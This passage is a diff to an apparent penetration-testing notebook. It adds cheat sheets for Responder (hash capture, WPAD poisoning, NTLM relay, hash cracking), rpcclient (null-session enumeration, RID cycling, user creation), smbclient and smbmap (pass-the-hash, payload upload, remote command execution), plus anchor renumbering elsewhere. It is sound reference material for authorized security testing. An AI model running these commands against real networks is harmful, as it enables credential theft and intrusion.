+<h3 id="config-file-location"><a class="header" href="#config-file-location">Config File Location</a></h3>
+<pre><code>/etc/responder/Responder.conf
+</code></pre>
+<p>or</p>
+<pre><code>/usr/share/responder/Responder.conf
+</code></pre>
+<h3 id="disable-specific-servers"><a class="header" href="#disable-specific-servers">Disable Specific Servers</a></h3>
+<p>Edit config file:</p>
+<pre><code class="language-ini">[Responder Core]
+SQL = Off
+SMB = On
+HTTP = On
+HTTPS = On
+</code></pre>
+<hr>
+<h2 id="captured-hashes"><a class="header" href="#captured-hashes">Captured Hashes</a></h2>
+<h3 id="hash-location"><a class="header" href="#hash-location">Hash Location</a></h3>
+<pre><code>/usr/share/responder/logs/
+</code></pre>
+<h3 id="hash-format-ntlmv2"><a class="header" href="#hash-format-ntlmv2">Hash Format (NTLMv2)</a></h3>
+<pre><code>user::DOMAIN:challenge:response:blob
+</code></pre>
+<h3 id="crack-with-hashcat"><a class="header" href="#crack-with-hashcat">Crack with Hashcat</a></h3>
+<pre><code class="language-bash">hashcat -m 5600 hashes.txt wordlist.txt
+</code></pre>
+<h3 id="crack-with-john"><a class="header" href="#crack-with-john">Crack with John</a></h3>
+<pre><code class="language-bash">john --format=netntlmv2 hashes.txt --wordlist=wordlist.txt
+</code></pre>
+<hr>
+<h2 id="attack-scenarios"><a class="header" href="#attack-scenarios">Attack Scenarios</a></h2>
+<h3 id="credential-capture"><a class="header" href="#credential-capture">Credential Capture</a></h3>
+<ol>
+<li>Run Responder: <code>sudo responder -I eth0</code></li>
+<li>Wait for victim to mistype share name or query non-existent host</li>
+<li>Responder poisons response</li>
+<li>Victim sends credentials to attacker</li>
+<li>Capture NTLMv1/v2 hash</li>
+</ol>
+<h3 id="wpad-attack"><a class="header" href="#wpad-attack">WPAD Attack</a></h3>
+<ol>
+<li>Run Responder with WPAD: <code>sudo responder -I eth0 -wFP</code></li>
+<li>Victim’s browser requests wpad.dat</li>
+<li>Responder forces authentication</li>
+<li>Capture credentials</li>
+</ol>
+<hr>
+<h2 id="combine-with-ntlm-relay"><a class="header" href="#combine-with-ntlm-relay">Combine with NTLM Relay</a></h2>
+<h3 id="disable-smbhttp-in-responder"><a class="header" href="#disable-smbhttp-in-responder">Disable SMB/HTTP in Responder</a></h3>
+<p>Edit Responder.conf:</p>
+<pre><code class="language-ini">SMB = Off
+HTTP = Off
+</code></pre>
+<h3 id="run-responder"><a class="header" href="#run-responder">Run Responder</a></h3>
+<pre><code class="language-bash">sudo responder -I eth0
+</code></pre>
+<h3 id="run-ntlmrelayx"><a class="header" href="#run-ntlmrelayx">Run ntlmrelayx</a></h3>
+<pre><code class="language-bash">impacket-ntlmrelayx -t smb://10.10.10.10 -smb2support
+</code></pre>
+<hr>
+<h2 id="best-practices"><a class="header" href="#best-practices">Best Practices</a></h2>
+<ul>
+<li>Run in analyze mode first (<code>-A</code>) to understand traffic</li>
+<li>Be aware of potential network disruption</li>
+<li>Use with ntlmrelayx for relay attacks instead of just capturing</li>
+<li>Check if SMB signing is disabled on targets</li>
+</ul>
+<hr>
+<h2 id="troubleshooting-1"><a class="header" href="#troubleshooting-1">Troubleshooting</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Issue</th><th>Solution</th></tr>
+</thead>
+<tbody>
+<tr><td>Port 445 in use</td><td>Disable local SMB: <code>systemctl stop smbd</code></td></tr>
+<tr><td>No captures</td><td>Check interface and network segment</td></tr>
+<tr><td>Hash not cracking</td><td>May need better wordlist or rules</td></tr>
+</tbody>
+</table>
+</div>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="rpcclient-cheatsheet"><a class="header" href="#rpcclient-cheatsheet">rpcclient Cheatsheet</a></h1>
+<p>Tool for executing MS-RPC functions on Windows systems.</p>
+<hr>
+<h2 id="basic-syntax-9"><a class="header" href="#basic-syntax-9">Basic Syntax</a></h2>
+<pre><code class="language-bash">rpcclient [options] &lt;server&gt;
+</code></pre>
+<hr>
+<h2 id="connection-options"><a class="header" href="#connection-options">Connection Options</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Option</th><th>Description</th><th>Example</th></tr>
+</thead>
+<tbody>
+<tr><td><code>-U USER</code></td><td>Username</td><td><code>rpcclient -U admin 10.10.10.10</code></td></tr>
+<tr><td><code>-W DOMAIN</code></td><td>Domain/Workgroup</td><td><code>rpcclient -U admin -W MYDOMAIN 10.10.10.10</code></td></tr>
+<tr><td><code>-N</code></td><td>No password (null session)</td><td><code>rpcclient -U '' -N 10.10.10.10</code></td></tr>
+<tr><td><code>-c CMD</code></td><td>Execute command and exit</td><td><code>rpcclient -U admin -c 'enumdomusers' 10.10.10.10</code></td></tr>
+<tr><td><code>--pw-nt-hash</code></td><td>Use NT hash for auth</td><td><code>rpcclient -U admin --pw-nt-hash 10.10.10.10</code></td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="connection-examples"><a class="header" href="#connection-examples">Connection Examples</a></h2>
+<h3 id="null-session"><a class="header" href="#null-session">Null Session</a></h3>
+<pre><code class="language-bash">rpcclient -U '' -N 10.10.10.10
+</code></pre>
+<h3 id="with-credentials-2"><a class="header" href="#with-credentials-2">With Credentials</a></h3>
+<pre><code class="language-bash">rpcclient -U 'admin%Password123' 10.10.10.10
+</code></pre>
+<h3 id="domain-account-1"><a class="header" href="#domain-account-1">Domain Account</a></h3>
+<pre><code class="language-bash">rpcclient -U 'DOMAIN\admin%Password123' 10.10.10.10
+</code></pre>
+<hr>
+<h2 id="server-information-commands"><a class="header" href="#server-information-commands">Server Information Commands</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Command</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><code>srvinfo</code></td><td>Server information</td></tr>
+<tr><td><code>querydispinfo</code></td><td>List users with descriptions</td></tr>
+<tr><td><code>querydominfo</code></td><td>Domain information</td></tr>
+<tr><td><code>netshareenum</code></td><td>Enumerate shares</td></tr>
+<tr><td><code>netshareenumall</code></td><td>Enumerate all shares</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="user-enumeration-commands"><a class="header" href="#user-enumeration-commands">User Enumeration Commands</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Command</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><code>enumdomusers</code></td><td>Enumerate domain users</td></tr>
+<tr><td><code>enumdomgroups</code></td><td>Enumerate domain groups</td></tr>
+<tr><td><code>queryuser &lt;RID&gt;</code></td><td>Query user by RID</td></tr>
+<tr><td><code>queryusergroups &lt;RID&gt;</code></td><td>Query user’s groups</td></tr>
+<tr><td><code>lookupnames &lt;name&gt;</code></td><td>Look up SID for name</td></tr>
+<tr><td><code>lookupsids &lt;SID&gt;</code></td><td>Look up name for SID</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="group-commands"><a class="header" href="#group-commands">Group Commands</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Command</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><code>enumdomgroups</code></td><td>List domain groups</td></tr>
+<tr><td><code>querygroup &lt;RID&gt;</code></td><td>Query group by RID</td></tr>
+<tr><td><code>querygroupmem &lt;RID&gt;</code></td><td>Query group members</td></tr>
+<tr><td><code>enumalsgroups builtin</code></td><td>Enumerate builtin groups</td></tr>
+<tr><td><code>enumalsgroups domain</code></td><td>Enumerate domain local groups</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="password-policy-commands"><a class="header" href="#password-policy-commands">Password Policy Commands</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Command</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><code>getdompwinfo</code></td><td>Get domain password info</td></tr>
+<tr><td><code>getusrdompwinfo &lt;RID&gt;</code></td><td>Get user password info</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="privilege-operations-requires-admin"><a class="header" href="#privilege-operations-requires-admin">Privilege Operations (Requires Admin)</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Command</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><code>createdomuser &lt;user&gt;</code></td><td>Create domain user</td></tr>
+<tr><td><code>deletedomuser &lt;user&gt;</code></td><td>Delete domain user</td></tr>
+<tr><td><code>setuserinfo2 &lt;user&gt; 23 &lt;pass&gt;</code></td><td>Change user password</td></tr>
+<tr><td><code>chgpasswd &lt;user&gt; &lt;oldpass&gt; &lt;newpass&gt;</code></td><td>Change password</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="common-examples-1"><a class="header" href="#common-examples-1">Common Examples</a></h2>
+<h3 id="enumerate-all-users"><a class="header" href="#enumerate-all-users">Enumerate All Users</a></h3>
+<pre><code class="language-bash">rpcclient -U '' -N 10.10.10.10 -c 'enumdomusers'
+</code></pre>
+<p>Output format: <code>user:[username] rid:[0xRID]</code></p>
+<h3 id="get-user-details"><a class="header" href="#get-user-details">Get User Details</a></h3>
+<pre><code class="language-bash">rpcclient -U '' -N 10.10.10.10 -c 'queryuser 0x1f4'
+</code></pre>
+<p>Note: 0x1f4 = 500 = Administrator RID</p>
+<h3 id="enumerate-groups-2"><a class="header" href="#enumerate-groups-2">Enumerate Groups</a></h3>
+<pre><code class="language-bash">rpcclient -U '' -N 10.10.10.10 -c 'enumdomgroups'
+</code></pre>
+<h3 id="get-password-policy-1"><a class="header" href="#get-password-policy-1">Get Password Policy</a></h3>
+<pre><code class="language-bash">rpcclient -U '' -N 10.10.10.10 -c 'getdompwinfo'
+</code></pre>
+<h3 id="rid-cycling-user-enumeration-1"><a class="header" href="#rid-cycling-user-enumeration-1">RID Cycling (User Enumeration)</a></h3>
+<pre><code class="language-bash">for i in $(seq 500 1100); do
+  rpcclient -U '' -N 10.10.10.10 -c "queryuser 0x$(printf '%x' $i)" 2&gt;/dev/null | grep "User Name"
+done
+</code></pre>
+<h3 id="create-user-admin-required"><a class="header" href="#create-user-admin-required">Create User (Admin Required)</a></h3>
+<pre><code class="language-bash">rpcclient -U 'admin%Password123' 10.10.10.10 -c 'createdomuser newuser'
+rpcclient -U 'admin%Password123' 10.10.10.10 -c 'setuserinfo2 newuser 23 NewPass123!'
+</code></pre>
+<h3 id="change-user-password"><a class="header" href="#change-user-password">Change User Password</a></h3>
+<pre><code class="language-bash">rpcclient -U 'admin%Password123' 10.10.10.10 -c 'chgpasswd username oldpass newpass'
+</code></pre>
+<hr>
+<h2 id="common-rids"><a class="header" href="#common-rids">Common RIDs</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>RID (Hex)</th><th>RID (Dec)</th><th>Account</th></tr>
+</thead>
+<tbody>
+<tr><td>0x1f4</td><td>500</td><td>Administrator</td></tr>
+<tr><td>0x1f5</td><td>501</td><td>Guest</td></tr>
+<tr><td>0x1f6</td><td>502</td><td>krbtgt</td></tr>
+<tr><td>0x200</td><td>512</td><td>Domain Admins</td></tr>
+<tr><td>0x201</td><td>513</td><td>Domain Users</td></tr>
+<tr><td>0x202</td><td>514</td><td>Domain Guests</td></tr>
+</tbody>
+</table>
+</div>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="smbclient-cheatsheet"><a class="header" href="#smbclient-cheatsheet">smbclient Cheatsheet</a></h1>
+<p>SMB/CIFS client for accessing Windows shares from Linux.</p>
+<hr>
+<h2 id="basic-syntax-10"><a class="header" href="#basic-syntax-10">Basic Syntax</a></h2>
+<pre><code class="language-bash">smbclient [options] //server/share
+</code></pre>
+<hr>
+<h2 id="connection-options-1"><a class="header" href="#connection-options-1">Connection Options</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Option</th><th>Description</th><th>Example</th></tr>
+</thead>
+<tbody>
+<tr><td><code>-L</code></td><td>List available shares</td><td><code>smbclient -L //10.10.10.10</code></td></tr>
+<tr><td><code>-N</code></td><td>No password (null session)</td><td><code>smbclient -N -L //10.10.10.10</code></td></tr>
+<tr><td><code>-U USER</code></td><td>Specify username</td><td><code>smbclient -U admin //10.10.10.10/share</code></td></tr>
+<tr><td><code>-W DOMAIN</code></td><td>Specify domain/workgroup</td><td><code>smbclient -W MYDOMAIN -U admin //10.10.10.10/share</code></td></tr>
+<tr><td><code>-p PORT</code></td><td>Specify port</td><td><code>smbclient -p 139 //10.10.10.10/share</code></td></tr>
+<tr><td><code>-I IP</code></td><td>Specify destination IP</td><td><code>smbclient -I 10.10.10.10 //server/share</code></td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="authentication-2"><a class="header" href="#authentication-2">Authentication</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Option</th><th>Description</th><th>Example</th></tr>
+</thead>
+<tbody>
+<tr><td><code>-U user%pass</code></td><td>Username and password</td><td><code>smbclient -U admin%Password123 //10.10.10.10/share</code></td></tr>
+<tr><td><code>-A authfile</code></td><td>Auth file (user/pass/domain)</td><td><code>smbclient -A creds.txt //10.10.10.10/share</code></td></tr>
+<tr><td><code>--pw-nt-hash</code></td><td>Use NT hash instead of password</td><td><code>smbclient -U admin --pw-nt-hash //10.10.10.10/share</code></td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="common-commands"><a class="header" href="#common-commands">Common Commands</a></h2>
+<h3 id="list-shares-null-session"><a class="header" href="#list-shares-null-session">List Shares (Null Session)</a></h3>
+<pre><code class="language-bash">smbclient -N -L //10.10.10.10
+</code></pre>
+<h3 id="connect-to-share"><a class="header" href="#connect-to-share">Connect to Share</a></h3>
+<pre><code class="language-bash">smbclient //10.10.10.10/sharename -U username
+</code></pre>
+<h3 id="connect-with-domain-account"><a class="header" href="#connect-with-domain-account">Connect with Domain Account</a></h3>
+<pre><code class="language-bash">smbclient //10.10.10.10/sharename -U 'DOMAIN\username'
+</code></pre>
+<hr>
+<h2 id="interactive-commands"><a class="header" href="#interactive-commands">Interactive Commands</a></h2>
+<p>Once connected, use these commands:</p>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Command</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><code>ls</code></td><td>List files in current directory</td></tr>
+<tr><td><code>cd DIR</code></td><td>Change directory</td></tr>
+<tr><td><code>pwd</code></td><td>Print current directory</td></tr>
+<tr><td><code>get FILE</code></td><td>Download file</td></tr>
+<tr><td><code>mget PATTERN</code></td><td>Download multiple files</td></tr>
+<tr><td><code>put FILE</code></td><td>Upload file</td></tr>
+<tr><td><code>mput PATTERN</code></td><td>Upload multiple files</td></tr>
+<tr><td><code>mkdir DIR</code></td><td>Create directory</td></tr>
+<tr><td><code>rmdir DIR</code></td><td>Remove directory</td></tr>
+<tr><td><code>rm FILE</code></td><td>Delete file</td></tr>
+<tr><td><code>recurse</code></td><td>Toggle recursive mode for mget/mput</td></tr>
+<tr><td><code>prompt</code></td><td>Toggle prompting for mget/mput</td></tr>
+<tr><td><code>exit</code></td><td>Disconnect</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="useful-examples-6"><a class="header" href="#useful-examples-6">Useful Examples</a></h2>
+<h3 id="download-all-files-recursively"><a class="header" href="#download-all-files-recursively">Download All Files Recursively</a></h3>
+<pre><code class="language-bash">smbclient //10.10.10.10/share -U user%pass -c 'recurse; prompt; mget *'
+</code></pre>
+<h3 id="execute-single-command"><a class="header" href="#execute-single-command">Execute Single Command</a></h3>
+<pre><code class="language-bash">smbclient //10.10.10.10/share -U user%pass -c 'ls'
+</code></pre>
+<h3 id="download-specific-file"><a class="header" href="#download-specific-file">Download Specific File</a></h3>
+<pre><code class="language-bash">smbclient //10.10.10.10/share -U user%pass -c 'get secrets.txt'
+</code></pre>
+<h3 id="upload-file"><a class="header" href="#upload-file">Upload File</a></h3>
+<pre><code class="language-bash">smbclient //10.10.10.10/share -U user%pass -c 'put payload.exe'
+</code></pre>
+<h3 id="pass-the-hash-authentication"><a class="header" href="#pass-the-hash-authentication">Pass-the-Hash Authentication</a></h3>
+<pre><code class="language-bash">smbclient //10.10.10.10/share -U admin --pw-nt-hash -W DOMAIN
+# Then enter NT hash when prompted
+</code></pre>
+<hr>
+<h2 id="auth-file-format"><a class="header" href="#auth-file-format">Auth File Format</a></h2>
+<p>Create a file with credentials:</p>
+<pre><code>username = admin
+password = Password123
+domain = MYDOMAIN
+</code></pre>
+<p>Use with: <code>smbclient -A authfile //server/share</code></p>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="smbmap-cheatsheet"><a class="header" href="#smbmap-cheatsheet">smbmap Cheatsheet</a></h1>
+<p>SMB enumeration tool for listing shares, permissions, and contents.</p>
+<hr>
+<h2 id="basic-syntax-11"><a class="header" href="#basic-syntax-11">Basic Syntax</a></h2>
+<pre><code class="language-bash">smbmap [options] -H &lt;host&gt;
+</code></pre>
+<hr>
+<h2 id="connection-options-2"><a class="header" href="#connection-options-2">Connection Options</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Option</th><th>Description</th><th>Example</th></tr>
+</thead>
+<tbody>
+<tr><td><code>-H HOST</code></td><td>Target host</td><td><code>smbmap -H 10.10.10.10</code></td></tr>
+<tr><td><code>-P PORT</code></td><td>SMB port (default 445)</td><td><code>smbmap -H 10.10.10.10 -P 139</code></td></tr>
+<tr><td><code>-u USER</code></td><td>Username</td><td><code>smbmap -u admin -H 10.10.10.10</code></td></tr>
+<tr><td><code>-p PASS</code></td><td>Password</td><td><code>smbmap -u admin -p Password123 -H 10.10.10.10</code></td></tr>
+<tr><td><code>-d DOMAIN</code></td><td>Domain</td><td><code>smbmap -u admin -p pass -d MYDOMAIN -H 10.10.10.10</code></td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="authentication-methods"><a class="header" href="#authentication-methods">Authentication Methods</a></h2>
+<h3 id="null-session-1"><a class="header" href="#null-session-1">Null Session</a></h3>
+<pre><code class="language-bash">smbmap -H 10.10.10.10 -u '' -p ''
+</code></pre>
+<h3 id="guest-session"><a class="header" href="#guest-session">Guest Session</a></h3>
+<pre><code class="language-bash">smbmap -H 10.10.10.10 -u 'guest' -p ''
+</code></pre>
+<h3 id="pass-the-hash-4"><a class="header" href="#pass-the-hash-4">Pass-the-Hash</a></h3>
+<pre><code class="language-bash">smbmap -H 10.10.10.10 -u admin -p 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0'
+</code></pre>
+<hr>
+<h2 id="enumeration-options-1"><a class="header" href="#enumeration-options-1">Enumeration Options</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Option</th><th>Description</th><th>Example</th></tr>
+</thead>
+<tbody>
+<tr><td><code>-r PATH</code></td><td>Recursively list directory</td><td><code>smbmap -r C$ -H 10.10.10.10 -u admin -p pass</code></td></tr>
+<tr><td><code>-R PATH</code></td><td>List shares recursively</td><td><code>smbmap -R -H 10.10.10.10 -u admin -p pass</code></td></tr>
+<tr><td><code>--depth N</code></td><td>Recursive depth (default 5)</td><td><code>smbmap -R --depth 3 -H 10.10.10.10</code></td></tr>
+<tr><td><code>-A PATTERN</code></td><td>Download files matching pattern</td><td><code>smbmap -A '*.txt' -R -H 10.10.10.10</code></td></tr>
+<tr><td><code>-q</code></td><td>Quiet mode (suppress banner)</td><td><code>smbmap -q -H 10.10.10.10</code></td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="file-operations-1"><a class="header" href="#file-operations-1">File Operations</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Option</th><th>Description</th><th>Example</th></tr>
+</thead>
+<tbody>
+<tr><td><code>--download PATH</code></td><td>Download file</td><td><code>smbmap --download 'C$\file.txt' -H 10.10.10.10 -u admin -p pass</code></td></tr>
+<tr><td><code>--upload SRC DST</code></td><td>Upload file</td><td><code>smbmap --upload payload.exe 'C$\payload.exe' -H 10.10.10.10 -u admin -p pass</code></td></tr>
+<tr><td><code>--delete PATH</code></td><td>Delete file</td><td><code>smbmap --delete 'C$\file.txt' -H 10.10.10.10 -u admin -p pass</code></td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="command-execution-1"><a class="header" href="#command-execution-1">Command Execution</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Option</th><th>Description</th><th>Example</th></tr>
+</thead>
+<tbody>
+<tr><td><code>-x CMD</code></td><td>Execute command</td><td><code>smbmap -x 'ipconfig' -H 10.10.10.10 -u admin -p pass</code></td></tr>
+<tr><td><code>--mode psexec</code></td><td>Use PsExec method</td><td><code>smbmap -x 'whoami' --mode psexec -H 10.10.10.10</code></td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="common-examples-2"><a class="header" href="#common-examples-2">Common Examples</a></h2>
+<h3 id="list-all-shares"><a class="header" href="#list-all-shares">List All Shares</a></h3>
+<pre><code class="language-bash">smbmap -H 10.10.10.10 -u admin -p Password123
+</code></pre>
+<p>Output shows share permissions:</p>
+<ul>
+<li><code>READ</code> - Can read files</li>
+<li><code>WRITE</code> - Can write files</li>
+<li><code>NO ACCESS</code> - Access denied</li>
+</ul>
+<h3 id="enumerate-share-contents"><a class="header" href="#enumerate-share-contents">Enumerate Share Contents</a></h3>
+<pre><code class="language-bash">smbmap -H 10.10.10.10 -u admin -p Password123 -r 'Share Name'
+</code></pre>
+<h3 id="recursive-listing-with-depth"><a class="header" href="#recursive-listing-with-depth">Recursive Listing with Depth</a></h3>
+<pre><code class="language-bash">smbmap -H 10.10.10.10 -u admin -p Password123 -R --depth 3
+</code></pre>
+<h3 id="download-all-text-files"><a class="header" href="#download-all-text-files">Download All Text Files</a></h3>
+<pre><code class="language-bash">smbmap -H 10.10.10.10 -u admin -p Password123 -R -A '\.txt$'
+</code></pre>
+<h3 id="multiple-hosts"><a class="header" href="#multiple-hosts">Multiple Hosts</a></h3>
+<pre><code class="language-bash">smbmap -H 10.10.10.0/24 -u admin -p Password123
+</code></pre>
+<hr>
+<h2 id="permission-levels"><a class="header" href="#permission-levels">Permission Levels</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Permission</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><code>READ ONLY</code></td><td>Can read files</td></tr>
+<tr><td><code>READ, WRITE</code></td><td>Full access</td></tr>
+<tr><td><code>NO ACCESS</code></td><td>Access denied</td></tr>
+<tr><td><code>ADMIN$</code></td><td>Administrative share (requires admin)</td></tr>
+<tr><td><code>C$</code></td><td>Default drive share (requires admin)</td></tr>
+<tr><td><code>IPC$</code></td><td>Inter-process communication</td></tr>
+</tbody>
+</table>
+</div>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="clouds"><a class="header" href="#clouds">Clouds</a></h1>
 <p>Notes related to various cloud service providers.</p>
@@ -12179,7 +13144,7 @@ IPv6 (Internet Protocol version 6) is the successor to IPv4, designed to address
 </ul>
 </li>
 </ol>
-<h2 id="best-practices"><a class="header" href="#best-practices">Best Practices</a></h2>
+<h2 id="best-practices-1"><a class="header" href="#best-practices-1">Best Practices</a></h2>
 <ol>
 <li>
 <p><strong>Zone Management:</strong></p>
@@ -12548,7 +13513,7 @@ IPv6 (Internet Protocol version 6) is the successor to IPv4, designed to address
 </ul>
 </li>
 </ol>
-<h2 id="best-practices-1"><a class="header" href="#best-practices-1">Best Practices</a></h2>
+<h2 id="best-practices-2"><a class="header" href="#best-practices-2">Best Practices</a></h2>
 <ol>
 <li>
 <p><strong>Designing Subnets:</strong></p>
@@ -16313,7 +17278,7 @@ Oracle File Upload Test
 <li><a href="#securing-kube-apiserver">Securing kube-apiserver</a>
 <ul>
 <li><a href="#access-controls">Access Controls</a></li>
-<li><a href="#authentication-2">Authentication</a></li>
+<li><a href="#authentication-3">Authentication</a></li>
 </ul>
 </li>
 </ul>
@@ -16322,7 +17287,7 @@ Oracle File Upload Test
 <p><a href="#2-cluster-hardening">Cluster Hardening</a></p>
 <ul>
 <li><a href="#securing-access-to-the-kubeapi-server">Securing Access to the KubeAPI Server</a></li>
-<li><a href="#authentication-2">Authentication</a>
+<li><a href="#authentication-3">Authentication</a>
 <ul>
 <li><a href="#user-accounts">User accounts</a></li>
 <li><a href="#service-accounts">Service Accounts</a></li>
@@ -17692,7 +18657,7 @@ k8s:enc:aescbc:v1:key1:ܨt&gt;;8ܑ%TUIodEs*lsHGwjeF8S!Aqaj\Pq;9Ⱥ7dJe{B2=|p4#'B
 <li>kube-apiserver should only listen on an HTTPS endpoint. There was an option to host kube-apiserver on an HTTP endpoint, but this option has been deprecated as of 1.10 and removed in 1.22</li>
 <li>kube-apiserver should have auditing enabled</li>
 </ul>
-<h3 id="authentication-2"><a class="header" href="#authentication-2">Authentication</a></h3>
+<h3 id="authentication-3"><a class="header" href="#authentication-3">Authentication</a></h3>
 <ul>
 <li>One can authentication to the KubeAPI server using certificates or a kubeconfig file</li>
 </ul>
@@ -19352,7 +20317,7 @@ EOF
 <li><a href="#daemonsets">DaemonSets</a></li>
 <li><a href="#static-pods">Static Pods</a></li>
 <li><a href="#multiple-schedulers">Multiple Schedulers</a></li>
-<li><a href="#authentication-3">Authentication</a></li>
+<li><a href="#authentication-4">Authentication</a></li>
 <li><a href="#authorization-1">Authorization</a></li>
 <li><a href="#api-groups">API Groups</a></li>
 <li><a href="#role-based-access-control-rbac">Role-Based Access Control (RBAC)</a></li>
@@ -19645,7 +20610,7 @@ spec:
 <li>Kubernetes supports multiple schedulers that can be used to schedule pods in a cluster.</li>
 <li>You can even create your own schedule and use it to schedule pods in a cluster.</li>
 </ul>
-<h2 id="authentication-3"><a class="header" href="#authentication-3">Authentication</a></h2>
+<h2 id="authentication-4"><a class="header" href="#authentication-4">Authentication</a></h2>
 <ul>
 <li>Authentication is the process of verifying the identity of a user or system.</li>
 <li>Kubernetes supports multiple authentication methods, including:
@@ -20146,7 +21111,7 @@ spec:
 </ul>
 </li>
 </ul>
-<h2 id="authentication-4"><a class="header" href="#authentication-4">Authentication</a></h2>
+<h2 id="authentication-5"><a class="header" href="#authentication-5">Authentication</a></h2>
 <ul>
 <li>Kubernetes does not manage user accounts itself. It depends on an external service to do that.</li>
 <li>All authentication is managed by the kube-api server</li>
@@ -21621,7 +22586,7 @@ read R BLOCK
 <li><strong>NFSv4</strong>: Released in 2000, it introduced significant enhancements, including stateful protocol, improved security features (like Kerberos authentication), and support for file locking and delegation.</li>
 <li><strong>NFSv4.1 and NFSv4.2</strong>: These are incremental updates to NFSv4, adding features like parallel NFS (pNFS) for improved performance and additional security enhancements.</li>
 </ul>
-<h2 id="configuration"><a class="header" href="#configuration">Configuration</a></h2>
+<h2 id="configuration-1"><a class="header" href="#configuration-1">Configuration</a></h2>
 <ul>
 <li>NFS is generally simple to configure. The <code>/etc/exports</code> file on the server specifies which directories are shared and the permissions for each client.
 <pre><code class="language-bash">rnemeth@htb[/htb]$ cat /etc/exports 
@@ -22192,7 +23157,7 @@ The SLOWLOG GET command returns entries from the slow log in chronological order
 <li><a href="#linux-observability-sources">Observability Sources</a></li>
 <li><a href="#per-process-analysis">Per-Process Analysis</a></li>
 <li><a href="#system-wide-analysis">System-Wide Analysis</a></li>
-<li><a href="#troubleshooting-1">Troubleshooting</a></li>
+<li><a href="#troubleshooting-2">Troubleshooting</a></li>
 </ul>
 <h2 id="subdirectories"><a class="header" href="#subdirectories">Subdirectories</a></h2>
 <h3 id="bash"><a class="header" href="#bash"><a href="systems/bash">Bash</a></a></h3>
@@ -23994,7 +24959,7 @@ nice day, isn't it?
 <li></li>
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
-<h1 id="troubleshooting-1"><a class="header" href="#troubleshooting-1">troubleshooting</a></h1>
+<h1 id="troubleshooting-2"><a class="header" href="#troubleshooting-2">troubleshooting</a></h1>
 <h2 id="measure-cpu-time-of-a-process"><a class="header" href="#measure-cpu-time-of-a-process">Measure CPU time of a process</a></h2>
 <p>We can measure CPU time using <code>time</code>. Be aware that there are two implementations of <code>time</code>, and you may be running the wrong one. There is a bash built-in named <code>time</code>, which does not provide extensive statistics. You want to use the time utility at <code>/usr/bin/time</code>. Run <code>which time</code> to see which one you are using.</p>
 <pre><code class="language-sh">ryan:// $ time httping -delay 2 www.google.com
@@ -25129,7 +26094,7 @@ customEvents
 <li><strong>Ease of Use</strong>: Straightforward command-line interface with clear syntax</li>
 </ul>
 <hr>
-<h2 id="installation-3"><a class="header" href="#installation-3">Installation</a></h2>
+<h2 id="installation-4"><a class="header" href="#installation-4">Installation</a></h2>
 <p>Medusa often comes pre-installed on popular penetration testing distributions. You can verify its presence by running:</p>
 <pre><code class="language-sh">medusa -h
 </code></pre>
@@ -25196,7 +26161,7 @@ sudo apt-get -y install medusa
 </table>
 </div>
 <hr>
-<h2 id="modules-1"><a class="header" href="#modules-1">Modules</a></h2>
+<h2 id="modules-2"><a class="header" href="#modules-2">Modules</a></h2>
 <p>Each module in Medusa is tailored to interact with specific authentication mechanisms, allowing it to send the appropriate requests and interpret responses for successful attacks.</p>
 <div class="table-wrapper">
 <table>
@@ -25298,7 +26263,7 @@ sudo apt-get -y install medusa
 <li><strong>Ease of Use</strong>: Hydra is relatively easy to use despite its power, with a straightforward command-line interface and clear syntax.</li>
 </ul>
 <hr>
-<h2 id="installation-4"><a class="header" href="#installation-4">Installation</a></h2>
+<h2 id="installation-5"><a class="header" href="#installation-5">Installation</a></h2>
 <p>Hydra often comes pre-installed on popular penetration testing distributions. You can verify its presence by running:</p>
 <pre><code class="language-sh">hydra -h
 </code></pre>
@@ -25307,7 +26272,7 @@ sudo apt-get -y install medusa
 sudo apt-get -y install hydra
 </code></pre>
 <hr>
